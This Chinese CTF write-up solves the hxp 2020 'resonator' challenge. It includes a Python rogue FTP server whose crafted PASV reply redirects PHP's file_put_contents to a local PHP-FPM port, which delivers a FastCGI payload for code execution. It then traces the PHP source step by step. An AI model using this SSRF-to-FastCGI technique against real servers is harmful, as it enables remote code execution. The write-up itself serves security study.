# hxp2020的resonator题解分析

阅读量 **199600**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-01-12 15:30:42

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t01f4801d3c7c2839be.jpg)

题目连接：<https://2020.ctf.link/internal/challenge/cb926472-66b2-4212-af86-b4aaf675d6ea/>

这个题我感觉很有意思，网上没有找到wp，所以来写一下wp，题目给了环境，可以注意到给的www.conf里的fpm是监听的9000端口，也就是和之前遇到的一些fastcgi的攻击有关

![](https://p2.ssl.qhimg.com/t0143533af4ee4b2a20.png)

题目也非常简单，代码就5行，就`file_put_contents`和`file_get_contents`，这个有什么办法可以rce吗？仅仅从php的代码来看，看不出什么漏洞，那就只有看看php的源代码了

    
    
    <?php
    $file = $_GET['file'] ?? '/tmp/file';
    $data = $_GET['data'] ?? ':)';
    file_put_contents($file, $data);
    echo file_get_contents($file);
    

## 解题

这里先给出poc和利用方法，第一步先生成fastcgi的攻击poc：

![](https://p0.ssl.qhimg.com/t01391d7d1aa7690aa6.png)

第二步在自己服务器上面搭好恶意的ftp服务并且监听2333端口：

    
    
    import socket
    
    host = '0.0.0.0'
    port = 23
    sk = socket.socket()
    sk.bind((host, port))
    sk.listen(5)
    
    conn, address = sk.accept()
    conn.send("200 \n")
    print '200'
    print conn.recv(20)
    
    conn.send("200 \n")
    print '200'
    print conn.recv(20)
    
    conn.send("200 \n")
    print '200'
    print conn.recv(20)
    
    conn.send("300 \n")
    print '300'
    print conn.recv(20)
    
    conn.send("200 \n")
    print '200'
    print conn.recv(20)
    print "ck"
    conn.send("227 127,0,0,1,8,6952\n")
    print '200'
    print conn.recv(20)
    
    conn.send("150 \n")
    print '150'
    print conn.recv(20)
    conn.close()
    exit()
    

![](https://p2.ssl.qhimg.com/t0174555ed28e7fd867.png)

![](https://p4.ssl.qhimg.com/t01ab99fa87343ddcb8.png)

第三步发送整体的payload得到flag，这里的payload是gopherus生成的poc从gopher://127.0.0.1:9000/_之后开始取的：

![](https://p4.ssl.qhimg.com/t01e468d19e7c09b088.png)

![](https://p4.ssl.qhimg.com/t01c2c6693493debd07.png)

## 分析做题的过程和思路

现在来分析一下php的源码吧，调试php的c源码这个应该都没有问题，直接从ftp协议解析的地方开始，我选择的是在window下面附加到php的http服务，下面是index.php的代码

![](https://p0.ssl.qhimg.com/t015a383e7014f5a401.png)

然后分析走到ftp协议时可以干一些什么，首先断点在连接tcp之后，在tcp连接成功后，他会得到服务端的返回内容，如果内容是200到299直接就不会报错，所以我们恶意服务器就返回满足他的条件的值就行

![](https://p2.ssl.qhimg.com/t01f4bcf8bb91a9e3d7.png)

继续跟踪发现这里得到的返回内容

![](https://p0.ssl.qhimg.com/t0150cf0df0753c24dd.png)

这里也就是为什么要是`200 \n`了，第4个字符必须得是空格才会结束不然就一直循环了

![](https://p0.ssl.qhimg.com/t0127a57a7609a3baa8.png)

然后也就到了第二个判断，这里判断是否会有密码，但是也必须是200到299，所以我们为200也可以过

![](https://p3.ssl.qhimg.com/t013fcef4bb1defb4d7.png)

![](https://p3.ssl.qhimg.com/t01115b7daabd524865.png)

然后就到了第三个判断，为200也可以过

![](https://p3.ssl.qhimg.com/t012118a576e6e235a8.png)

第四个判断就得300了，因为`allow_overwrite`不为真

![](https://p4.ssl.qhimg.com/t01357e44cce9abe124.png)

![](https://p4.ssl.qhimg.com/t01bc28c739847ff234.png)

就到了第五个判断了，这次就得为200，不然就会进入ipv6的解析

![](https://p5.ssl.qhimg.com/t0140c0581a9e7bf699.png)

第六个判断了，这次就得为227并且后面得有符合条件的字符串，因为他会把后面的字符串解析为ip和端口

![](https://p1.ssl.qhimg.com/t01b06a4d9f7752dc4a.png)

这也是为什么poc里面的是`,`为ip地址的分隔，先解析ip，得到ip为`127.0.0.1`

![](https://p2.ssl.qhimg.com/t01336ef8363084764e.png)

![](https://p1.ssl.qhimg.com/t01bbeb5d295a0da810.png)

经过测试计算发现为6952后就会得到9000的端口

![](https://p3.ssl.qhimg.com/t019cee40b3f5a8735b.png)

然后就会从解析的ip和端口进行写入数据

![](https://p2.ssl.qhimg.com/t0197d7490409bf153c.png)

所以我们在window上面监听9000端口

![](https://p3.ssl.qhimg.com/t0129857a76928335df.png)

然后继续执行，发现成功建立了socket连接

![](https://p0.ssl.qhimg.com/t0199820ac15756d3d4.png)

![](https://p3.ssl.qhimg.com/t0175a6c9a8f7f22285.png)

然后到了第七个判断，直接为150就可以继续执行

![](https://p4.ssl.qhimg.com/t01f4472b9703374347.png)

然后就会把写入的句柄交到新的tcp连接上面，剩下的就是一气呵成了，然后就可以看到我们收到的数据和`file_put_contents`里面写入的一样

![](https://p4.ssl.qhimg.com/t01b4a2d8f016e53ed6.png)

总结：感觉作为一个web手还是得多了解一下关于语言底层的构造，这样可能就会发现更多的特性和技巧。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **123qwer** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/226750](/post/id/226750)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __6赞

 __收藏

![](https://thirdqq.qlogo.cn/g?b=oidb&k=PCGUeYx0xXvaXeCPiceiauNA&s=40&t=1557114336)
123qwer

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

